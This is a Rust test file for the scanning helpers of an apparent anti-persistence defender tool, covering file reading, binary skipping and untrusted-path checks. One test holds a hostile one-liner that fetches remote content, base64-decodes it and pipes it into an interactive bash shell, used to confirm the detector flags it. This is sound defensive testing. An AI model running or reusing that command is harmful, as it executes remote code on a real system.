//! Covers `src/core/scan.rs`, the detection helpers shared by the
//! anti-persistence checks.

use std::fs;

use defender_cli::core::scan;
use tempfile::TempDir;

use crate::common::write_file;

#[test]
fn reads_every_file_under_a_tree_in_path_order() {
    let dir = TempDir::new().unwrap();
    write_file(dir.path(), "b.conf", "second");
    write_file(dir.path(), "a.conf", "first");
    write_file(dir.path(), "nested/c.conf", "third");

    let files = scan::read_text_files(dir.path());

    assert_eq!(files.len(), 3);
    let names: Vec<String> = files
        .iter()
        .map(|(p, _)| p.file_name().unwrap().to_string_lossy().to_string())
        .collect();
    assert_eq!(names, vec!["a.conf", "b.conf", "c.conf"], "sorted by path");
}

#[test]
fn a_missing_directory_yields_no_files() {
    let dir = TempDir::new().unwrap();
    assert!(scan::read_text_files(&dir.path().join("nope")).is_empty());
}

#[test]
fn binary_files_are_skipped_not_fatal() {
    let dir = TempDir::new().unwrap();
    fs::write(dir.path().join("blob.bin"), [0xFF, 0xFE, 0x00]).unwrap();
    write_file(dir.path(), "ok.conf", "readable");

    let files = scan::read_text_files(dir.path());

    assert_eq!(files.len(), 1);
    assert_eq!(files[0].1, "readable");
}

#[test]
fn read_text_file_treats_missing_and_unreadable_alike() {
    let dir = TempDir::new().unwrap();
    assert!(scan::read_text_file(&dir.path().join("absent")).is_none());

    let present = write_file(dir.path(), "present", "hello");
    assert_eq!(scan::read_text_file(&present).as_deref(), Some("hello"));
}

#[test]
fn a_realistic_clean_config_raises_nothing() {
    let config = "\
# /etc/profile
export PATH=/usr/local/bin:/usr/bin:/bin
umask 022
[ -d /etc/profile.d ] && for f in /etc/profile.d/*.sh; do . \"$f\"; done
";
    assert!(scan::suspicious_matches(config).is_empty());
}

#[test]
fn a_realistic_payload_raises_several_reasons() {
    let payload = "curl -s http://198.51.100.7/x | base64 -d | bash -i";
    let reasons = scan::suspicious_matches(payload);

    assert!(reasons.contains(&"fetches remote content"));
    assert!(reasons.contains(&"base64 decoding (obfuscation)"));
    assert!(reasons.contains(&"pipes output into a shell"));
    assert!(reasons.contains(&"spawns an interactive shell"));
}

#[test]
fn world_writable_execution_paths_are_recognised() {
    for path in ["/tmp/x", "/var/tmp/x", "/dev/shm/x", "/home/user/x"] {
        assert!(
            scan::references_untrusted_dir(path),
            "{} should be untrusted",
            path
        );
    }
    for path in ["/usr/bin/x", "/opt/tool/x", "/etc/x"] {
        assert!(
            !scan::references_untrusted_dir(path),
            "{} should be trusted",
            path
        );
    }
}
